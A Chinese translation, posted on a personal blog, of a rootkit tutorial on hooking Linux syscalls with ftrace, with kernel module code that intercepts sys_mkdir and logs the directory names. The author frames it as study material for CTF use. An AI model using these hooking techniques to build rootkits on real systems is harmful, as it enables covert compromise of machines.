<!DOCTYPE html>
<html lang="zh-cn">







<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="preconnect" href="//www.googletagmanager.com">
	<link rel="preconnect" href="//zz.bdstatic.com">
	<link rel="preconnect" href="//sp0.baidu.com">
	<link rel="preconnect" href="//www.google-analytics.com">
	<link rel="preconnect" href="//cdn1.lncld.net">
	<link rel="preconnect" href="//unpkg.com">
	<link rel="preconnect" href="//app-router.leancloud.cn">
	<link rel="preconnect" href="//9qpuwspm.api.lncld.net">
	<link rel="preconnect" href="//gravatar.loli.net">

	<title>Linux Rookit 教程(2)：Ftrace和Hook函数 | Se8S0n</title>

	<meta name="HandheldFriendly" content="True">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
	<meta name="generator" content="hexo">
	<meta name="author" content="Se8S0n">
	<meta name="description" content>

	
	<meta name="keywords" content>
	

	
	<link rel="shortcut icon" href="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1628223674/blog_setting/unnamed.jpg">
	<link rel="apple-touch-icon" href="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1628223674/blog_setting/unnamed.jpg">
	

	
	<meta name="theme-color" content="#3c484e">
	<meta name="msapplication-TileColor" content="#3c484e">
	

	

	

	<meta property="og:site_name" content="Se8S0n">
	<meta property="og:type" content="article">
	<meta property="og:title" content="Linux Rookit 教程(2)：Ftrace和Hook函数 | Se8S0n">
	<meta property="og:description" content>
	<meta property="og:url" content="http://Se8S0n.github.io.git/2021/08/22/Linux-Rookit教程2：Ftrace和Hook函数/">

	
	<meta property="article:published_time" content="2021-08-22T15:08:00+08:00"> 
	<meta property="article:author" content="Se8S0n">
	<meta property="article:published_first" content="Se8S0n, /2021/08/22/Linux-Rookit教程2：Ftrace和Hook函数/">
	

	
	
	<link rel="stylesheet" href="/css/allinonecss.min.css">

	
	
	
</head>

<body class="post-template">
	<div class="site-wrapper">
		




<header class="site-header post-site-header outer">
    <div class="inner">
        
<nav class="site-nav"> 
    <div class="site-nav-left">
        <ul class="nav">
            <li>
                
                <a href="/" title="Home">HOME</a>
                
            </li>
            
            
            <li>
                <a href="/about" title="ABOUT">ABOUT</a>
            </li>
            
            <li>
                <a href="/archives" title="ARCHIVES">ARCHIVES</a>
            </li>
            
            <li>
                <a href="/friends" title="FRIENDS">FRIENDS</a>
            </li>
            
            
        </ul> 
    </div>
    
    <div class="search-button-area">
        <a href="#search" class="search-button">Search ...</a>
    </div>
     
    <div class="site-nav-right">
        
        <a href="#search" class="search-button">Search ...</a>
         
        
<div class="social-links">
    
    
    <a class="social-link" title="github" href="https://github.com/Se8S0n" target="_blank" rel="noopener">
        <svg viewbox="0 0 1049 1024" xmlns="http://www.w3.org/2000/svg"><path d="M524.979332 0C234.676191 0 0 234.676191 0 524.979332c0 232.068678 150.366597 428.501342 358.967656 498.035028 26.075132 5.215026 35.636014-11.299224 35.636014-25.205961 0-12.168395-0.869171-53.888607-0.869171-97.347161-146.020741 31.290159-176.441729-62.580318-176.441729-62.580318-23.467619-60.841976-58.234462-76.487055-58.234463-76.487055-47.804409-32.15933 3.476684-32.15933 3.476685-32.15933 53.019436 3.476684 80.83291 53.888607 80.83291 53.888607 46.935238 79.963739 122.553122 57.365291 152.97411 43.458554 4.345855-33.897672 18.252593-57.365291 33.028501-70.402857-116.468925-12.168395-239.022047-57.365291-239.022047-259.012982 0-57.365291 20.860106-104.300529 53.888607-140.805715-5.215026-13.037566-23.467619-66.926173 5.215027-139.067372 0 0 44.327725-13.906737 144.282399 53.888607 41.720212-11.299224 86.917108-17.383422 131.244833-17.383422s89.524621 6.084198 131.244833 17.383422C756.178839 203.386032 800.506564 217.29277 800.506564 217.29277c28.682646 72.1412 10.430053 126.029806 5.215026 139.067372 33.897672 36.505185 53.888607 83.440424 53.888607 140.805715 0 201.64769-122.553122 245.975415-239.891218 259.012982 19.121764 16.514251 35.636014 47.804409 35.636015 97.347161 0 70.402857-0.869171 126.898978-0.869172 144.282399 0 13.906737 9.560882 30.420988 35.636015 25.205961 208.601059-69.533686 358.967656-265.96635 358.967655-498.035028C1049.958663 234.676191 814.413301 0 524.979332 0z"/></svg>
    </a>
    
    
    
    <a class="social-link" title="twitter" href="https://twitter.com/Seson84186492" target="_blank" rel="noopener">
        <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>

    </a>
    
    
    
    
</div>
    </div>
</nav>
    </div>
</header>


<div id="site-main" class="site-main outer" role="main">
    <div class="inner">
        <header class="post-full-header">
            <div class="post-full-meta">
                <time class="post-full-meta-date" datetime="2021-08-22T22:47:18.000Z">
                    2021-08-22
                </time>
                
                <span class="date-divider">/</span>
                
                
            </div>
            <h1 class="post-full-title">Linux Rookit 教程(2)：Ftrace和Hook函数</h1>
        </header>
        <div class="post-full no-image">
            
            <div class="post-full-content">
                <article id="photoswipe" class="markdown-body">
                    <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>本篇文章翻译自<a href="https://xcellerator.github.io/posts/linux_rootkits_02/" target="_blank" rel="noopener">Linux Rootkits Part 2: Ftrace and Function Hooking</a>，由于近段时间有了解Linux Rookit的需要，借这篇翻译文章补一下自己Linux Kernel的基础知识和学习写Linux Kernel shellcode的方法。</p>
<h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2 正文"></a>2 正文</h1><p>学习完<a href="https://xcellerator.github.io/posts/linux_rootkits_01/" target="_blank" rel="noopener">Linux Rootkits Part 1: Introduction and Workflow</a>之后，你已经会写一个内核模块了。不想止步于此，你可能会想做一点更酷的事，比如篡改运行中内核的执行流程。在这篇文章中，我们介绍的更改Linux内核执行流程的方法就是hook函数，不过问题是，我们怎么知道自己应该hook哪一个函数呢？</p>
<p>我们很幸运，Linux内核提供了一堆潜在的可Hook的目标函数——syscalls(系统调用函数)！可以在系统调用函数中寻找用于Hook的函数，Syscalls是内核函数，可以在用户态下调用。常见的系统调用函数如下：</p>
<ul>
<li>open</li>
<li>read</li>
<li>write</li>
<li>close</li>
<li>execve</li>
<li>fork</li>
<li>kill</li>
<li>mkdir</li>
</ul>
<p>完整的syscalls列表可以在<a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">linux源码的syscall_64.tbl</a>看到。内核态中看到这些函数都会加上<code>sys_</code>的前缀的，可以在linux操作系统中用<code>sudo cat /proc/kallsyms | grep function_name</code>获取目标函数地址的偏移量。通过hook syscalls，可以让我们打断类似于<code>sys_read</code>系统调用函数执行的流程，返回与<code>sys_read</code>原本会读取出来不同的数据。或者用<code>sys_execve</code>添加我们自定义的函数变量，甚至可以利用<code>sys_kill</code>系统调用函数中不被用到的信号向rookit中发送下一条指令让其执行特定的操作。</p>
<p>要完成上述的操作之前，需要我们先了解如何在<strong>用户态</strong>中调用<code>syscalls</code>(系统调用函数), 了解完之后才能知道如何中断系统调用函数的调用过程。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hook-&gt;ops.func = fh_ftrace_thunk;</span><br><span class="line">hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS</span><br><span class="line">                | FTRACE_OPS_FL_RECURSION_SAFE</span><br><span class="line">                | FTRACE_OPS_FL_IPMODIFY;</span><br></pre></td></tr></table></figure></p>
<p>如上所述，<code>rip</code>可能已经被修改好了，所以在这里通过设置<code>FTRACE_OPS_FL_IP_MODIFY</code>标志位向ftrace告警。为了设置<code>FTRACE_OPS_FL_IP_MODIFY</code>标志位，我们还需要在hook的过程中给原本系统调用函数中的<code>pt_regs</code>结构体传一个<code>FTRACE_OPS_FL_SAVE_REGS</code>标志位。最后，为了关闭ftrace内置的递归保护机制，就设置了<code>FTRACE_OPS_FL_RECURSION_SAFE</code>标志位。<code>FTRACE_OPS_FL_SAVE_REGS</code>标志位是默认开启的，为了我们的hook能起作用最有效的方式就是关闭ftrace的保护机制。</p>
<blockquote>
<p>显而易见，如果ftrace的保护机制利用的是保存在<code>rip</code>寄存器中的返回地址，仅仅告诉ftrace我们要修改<code>rip</code>的值是不够的，ftrace仍旧有不利于我们的保护机制。</p>
</blockquote>
<p>除了设置上面的标志位之外，我们还需要给<code>fh_trace_thunk</code>函数中的<code>ops.func</code>子域设置标志位（<code>fh_trace_thunk</code>函数是我们之前讲回调时就提到的函数）。这个函数的功能，是修改<code>rip</code>寄存器中的数值，让其指向<code>hook-&gt;function</code>存的地址。剩下的工作就是要保证不论什么时候<code>rip</code>寄存器保存着<code>sys_mkdir</code>地址的时候，都能回调hook函数。</p>
<p>这个工作，交给了最后讲解的两个函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">err = ftrace_set_filter_ip(&amp;hook-&gt;ops, hook-&gt;address, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(err)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"rootkit: ftrace_set_filter_ip() failed: %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = register_ftrace_function(&amp;hook-&gt;ops);</span><br><span class="line"><span class="keyword">if</span>(err)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"rootkit: register_ftrace_function() failed: %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>ftrace_set_filter_ip()</code>函数，告知ftrace当<code>rip</code>寄存器中保存<code>sys_mkdir</code>系统调用函数的地址的时候，就执行我们写的回调函数(此时我们要hook的<code>sys_mkdir</code>函数的地址已经早早存在了<code>hook-&gt;function</code>中)。最后，设置好这些就达成了调用<code>register_ftrace_function()</code>的目的。到这一步，我们的函数钩子就已经就位了。</p>
<p>如你所想，一旦unload rookit模块并调用<code>rookit_exit()</code>函数，<code>fh_remove_hooks()</code>函数就会反向完成上面的操作，还原原本的执行流程。</p>
<p>看到这里你应该就知道，为什么我一开始说不用百分百了解完ftrace使用的原理就能写一个系统调用函数的hook函数。实际上这里面最大的挑战是写hook函数的本身，不过在实际写的过程中还是会遇到很多问题的。</p>
<h2 id="2-1-Linux在用户态中调用syscalls"><a href="#2-1-Linux在用户态中调用syscalls" class="headerlink" title="2.1 Linux在用户态中调用syscalls"></a>2.1 Linux在用户态中调用<code>syscalls</code></h2><p>在<a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">linux源码的syscall_64.tbl</a>中可以看到每一个<code>syscalls</code>前面都对应着一个数字，这个数字实际上是用户在调用系统函数的时候需要传递的系统调用号(syscalls number)。不过这些系统调用号不是固定的，系统调用号在不同版本的架构和内核版本中有可能会不同。</p>
<p>调用<code>syscalls</code>之前，需要先将系统调用号(<code>syscall number</code>)存储到特定的寄存器中——<code>rax</code>寄存器(x86架构是在eax寄存器中), 之后再利用软件中断<code>syscall</code>调用内核中的函数。所有的<code>syscalls</code>调用之前都需要先将<code>syscalls number</code>存到rax中，大多数函数调用的返回值也会存储在<code>rax</code>中。</p>
<p><code>syscall 0</code>(<code>sys_read()</code>)是一个很典型的例子，在Linux操作系统中用<code>man 2 read</code>可以找到<code>read</code>函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure></p>
<p>根据手册对<code>read</code>函数的描述，<code>fd</code>是文件描述符(调用<code>open()</code>函数返回的值)，<code>buf</code>是一个用于存储读取的数据的缓冲区，<code>count</code>是读取的字节数。如果<code>read</code>函数成功读取的话会返回读取的字节数，读取失败则会返回<code>-1</code>。根据上面的描述，我们可以知道，在调用<code>sys_read</code>函数之前，我们需要传递三个参数。不过，我们怎么知道这三个参数应该放在哪个对应的寄存器中呢？从<a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">Linux Syscall Reference(64 bit)</a>的表中我们可以查到，<code>sys_read</code>函数在传递参数的过程中会使用到rax、rdi、rsi、rdx寄存器，其存放的对应参数具体如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">function_name</th>
<th style="text-align:center">rax</th>
<th style="text-align:center">rdi</th>
<th style="text-align:center">rsi</th>
<th style="text-align:center">rdx</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">sys_read</td>
<td style="text-align:center">0x00</td>
<td style="text-align:center">unsigned int fd</td>
<td style="text-align:center">char __user * buf</td>
<td style="text-align:center">size_t count</td>
</tr>
</tbody>
</table>
<p><code>rdi</code>寄存器存储文件描述符<code>fd</code>，<code>rsi</code>寄存器存储缓冲区<code>buf</code>，<code>rdx</code>寄存器用于存储字节数<code>count</code>。只要我们往<code>rax</code>寄存器中存入<code>0x00</code>就能调用<code>sys_read</code>函数了。用<code>nasm</code>汇编写的调用<code>sys_read</code>代码大致的样子如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">mov rax, 0x00</span><br><span class="line">mov rdi, 5</span><br><span class="line">mov rsi, buf</span><br><span class="line">mov rdx, 10</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></p>
<p>这段代码从文件描述符<code>5</code>(这个数是随便选的)中读取了10字节的数据存入到<code>buf</code>指向的内存地址中。</p>
<h2 id="2-2-内核处理syscalls的过程"><a href="#2-2-内核处理syscalls的过程" class="headerlink" title="2.2 内核处理syscalls的过程"></a>2.2 内核处理<code>syscalls</code>的过程</h2><p>上一段结尾写的汇编代码能够在用户态的环境下正常运行，不过内核中是如何处理<code>syscalls</code>的呢？本篇文章介绍的<code>rookit</code>需要运行在内核态中，所以我们接下来应该了解一下内核是如何处理<code>syscalls</code>调用的。接下来介绍的内容，跟上面的会有一些区别。从<code>4.17.0</code>版本的Linux内核开始，内核处理<code>syscalls</code>调用的方式就发生了变化。不过我们在这里还是会先从旧的内核处理<code>syscalls</code>的方式开始介绍，因为<code>Ubuntu 16.04</code>发行版到现在还在使用这种处理方式，而且一旦理解了旧的处理方法，新的处理方法也会更好懂。</p>
<blockquote>
<p>由于作者本人的Rootkit应用场景是在CTF中，且应用环境的内核版本低于<code>4.17.0</code>，环境中配置了<code>sudo</code>，因此在操作过程中可以不用密码以root权限运行<code>insmod</code>命令。有点冲突的是，运行的环境是<code>Ubuntu 16.04</code>，而作者写的rookits应用于hook新的<code>syscalls</code>。</p>
</blockquote>
<p>从<a href="https://github.com/torvalds/linux/blob/b07175dc41babfec057f494d22a750af755297d8/include/linux/syscalls.h#L468" target="_blank" rel="noopener"><code>syscall.h</code>源码</a>中可以看到<code>sys_read</code>在内核中定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>回到2016年，想要准确地给syscalls传递参数，只要按照它地定义方式来就可以了。如果我们想hook <code>sys_read</code>，在把hook放对位置的前提下，只要模仿<code>sys_read</code>函数定义即可，具体参数处理的过程想怎么写都行。</p>
<p>然而，64位的4.17.0版本的内核中我们不能这样做了。用户存储在寄存器中的参数，会被拷贝到一个特殊的结构体中——<code>pt_regs</code>，只有这个结构体会被传递给<code>syscall</code>。接下来，<code>syscall</code>只负责从结构体中取出它需要的参数。可以从<a href="https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12" target="_blank" rel="noopener"><code>ptrace.h</code>的源码中</a>看到，<code>pt_regs</code>结构体的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> bx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> dx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> si;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> di;</span><br><span class="line">    <span class="comment">/*为了看起来更清晰省略了后面的内容*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这就意味着，我们不能随意地操作<code>sys_read</code>传递地参数了，我们要写的话必须像下面这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage long sys_read(const struct pt_regs * regs)</span><br><span class="line">&#123;</span><br><span class="line">    int fd = regs-&gt;fd;</span><br><span class="line">    char __user *buf = reg-&gt;si;</span><br><span class="line">    size_t count = regs-&gt;dx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当然，真实的<code>sys_read</code>函数并不需要这样做，因为内核已经帮我们处理好了这部分工作了。不过，在我们写hook的函数的时候，我们还会需要这样处理这些参数。</p>
<h2 id="2-3-首次写hook系统调用函数的函数"><a href="#2-3-首次写hook系统调用函数的函数" class="headerlink" title="2.3 首次写hook系统调用函数的函数"></a>2.3 首次写hook系统调用函数的函数</h2><p>带着前面了解的知识，我们接下来一起学习怎么写一个hook功能的函数。在下面的示例中囊括了新旧两版Hook系统函数的方法(Linux Kernel 4.17.0前后写Hook函数的方式不同)，该函数简单地hook了<code>sys_mkdir</code>系统调用函数，并且将<code>sys_mkdir</code>函数创建地目录名称输出到内核缓冲区中。完成上述功能之后，我们需要担忧的就是原本的<code>sys_mkdir</code>的函数的功能没有实现，只有我们写的hook函数起作用了。</p>
<p>首先，我们需要利用<code>linux/version.h</code>头文件check Linux内核版本，接着只要直接使用一堆预处理宏(preprocessor macros)就行了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/namei.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"TheXcellerator"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"mkdir syscall hook"</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">"0.01"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_X86_64) &amp;&amp; (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTREGS_SYSCALL_STUBS 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTREGS_SYSCALL_STUBS</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> asmlinkage <span class="title">long</span> <span class="params">(*orig_mkdir)</span><span class="params">(<span class="keyword">const</span> struct pt_regs *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">hook_mkdir</span><span class="params">(<span class="keyword">const</span> struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> __user *pathname = (<span class="keyword">char</span> *)regs-&gt;di;</span><br><span class="line">    <span class="keyword">char</span> dir_name[NAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> error = strncpy_from_user(dir_name, pathname, NAME_MAX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error &gt; <span class="number">0</span>)</span><br><span class="line">        printk(KERN_INFO <span class="string">"rootkit: trying to create directory with name: %s\n"</span>, dir_name);</span><br><span class="line"></span><br><span class="line">    orig_mkdir(regs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> asmlinkage <span class="title">long</span> <span class="params">(*orig_mkdir)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *pathname, <span class="keyword">umode_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">hook_mkdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *pathname, <span class="keyword">umode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dir_name[NAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> error = strncpy_from_user(dir_name, pathname, NAME_MAX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error &gt; <span class="number">0</span>)</span><br><span class="line">        printk(KERN_INFO <span class="string">"rootkit: trying to create directory with name %s\n"</span>, dir_name);</span><br><span class="line"></span><br><span class="line">    orig_mkdir(pathname, mode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* init and exit functions where the hooking will happen later */</span></span><br></pre></td></tr></table></figure>
<p>好吧，这堆代码中有很多需要进行解释的地方。直接看代码能发现，代码被if/else分成了两个类似的功能模块。用if判断check完操作系统的内核版本以及架构之后，若满足Linux操作系统是64位的且内核版本大于<code>4.17.0</code>的条件，则定义宏<code>PTREGS_SYSCALL_STUBS</code>并赋值为1，若不满足该条件则不定义。当<code>PTREGS_SYSCALL_STUBS</code>的值为<code>1</code>时(内核版本大于<code>4.17.0</code>的64位Linux操作系统)，代码通过定义<code>orig_mkdir</code>函数指针和<code>hook_mkdir</code>函数声明去操作<code>pt_regs</code>结构体。<code>PTREGS_SYSCALL_STUBS</code>的值不为<code>1</code>时，在hook函数声明时直接使用参数实际名称。需要注意的是，在新版本内核的Hook函数中，必须包含下面的一行代码才能实现从<code>regs</code>结构体中取出<code>pathname</code>参数的值的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char __user *pathname = (char *)regs-&gt;di;</span><br></pre></td></tr></table></figure></p>
<p>另一个需要注意的点是，<code>strncpy_from_user</code>函数的使用。<code>pathname</code>参数定义时使用了<code>__user</code>标识符，这意味着<code>pathname</code>参数指向用户空间的位置，不需要映射到我们的地址空间(内核空间)中。当<code>printk()</code>间接引用<code>pathname</code>指针时(取pathname指针的值)，可能会造成段错误或直接打印出垃圾数据，上述两种情况都不是我们想要的。</p>
<p>为了避免这两种情况，Linux内核给我们提供了一系列的函数，有像<code>copy_from_user()</code>、<code>strncpy_from_user()</code>等从用户空间拷贝数据的函数，还有将数据拷回用户空间的<code>copy_to_user</code>函数。经过上面的简要介绍后，就能知道代码中的<code>strncpy_from_user()</code>函数从用户空间中的<code>pathname</code>拷贝<code>NAME_MAX</code>个字符的数据到<code>dir_name</code>中，<code>NAME_MAX</code>通常为<code>255</code>（该值为Linux文件名的最大长度）或空字节。与简单的旧函数<code>copy_from_user()</code>相比，<code>strncpy_from_user()</code>函数可以识别出空字节。</p>
<p>一旦我们获取了存储在<code>dir_name</code>缓冲区中新创建的文件夹名称后，代码就会继续运行，并调用<code>printk()</code>函数以常见的字符串<code>%s</code>格式将文件夹名称输出到内核缓冲区中。</p>
<p>最后，讲解一下两个条件分支中最重要的部分——<code>orig_mkdir()</code>函数的调用。在调用<code>orig_mkdir()</code>函数的时候，传递了与<code>sys_mkdir()</code>函数调用时相对应的参数，这保证了原本<code>sys_mkdir()</code>函数的功能能够正常实现。你可能好奇，<code>orig_mkdir()</code>函数和<code>sys_mkdir()</code>函数是怎么联系起来的，实际上，代码实现时用函数指针原型(function pointer prototype)定义<code>orig_mkdir()</code>就可以让<code>orig_mkdir()</code>函数实现<code>sys_mkdir()</code>的功能了。</p>
<h2 id="2-4-用Ftrace-Hook函数"><a href="#2-4-用Ftrace-Hook函数" class="headerlink" title="2.4 用Ftrace Hook函数"></a>2.4 用Ftrace Hook函数</h2><p>为了在内核中加上Hook函数，代码中调用了<code>Ftrace</code>函数，具体的<code>Ftrace</code>函数利用过程没必要非常了解，只要知道个大概就行。源码<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h" target="_blank" rel="noopener"><code>ftrace_helper.h</code></a>中一开始创建了一个<code>ftrace_hook</code>数组，接着在<code>rootkit_init()</code>中调用<code>fh_install_hooks()</code>，在<code>rootkit_exit()</code>中调用<code>fh_uninstall_hooks()</code>。知道前面这一点，你就能直接进行实操了。任何一个rookit最需要消化的部分是hook它本身，这部分的内容我会在后续的博客中重点介绍。我们所有的需要利用<code>Ftrace()</code>实现的功能已经打包到<code>ftrace_helper.h</code>头文件中了。</p>
<p>可能有一部分人会因为就学了一丢丢感觉不满意，所以在<code>2.2.5</code>节中对<code>Ftrace()</code>进行了更全面的讲解。如果你没有这样的想法，那就更好了。</p>
<p>接下来继续讲解如何用<code>Ftrace</code> hook函数，使用之前需要将<code>ftrace_helper.h</code>的文件头包含到我们自己写的module源码中，接着为我们写的module写好init和exit函数。</p>
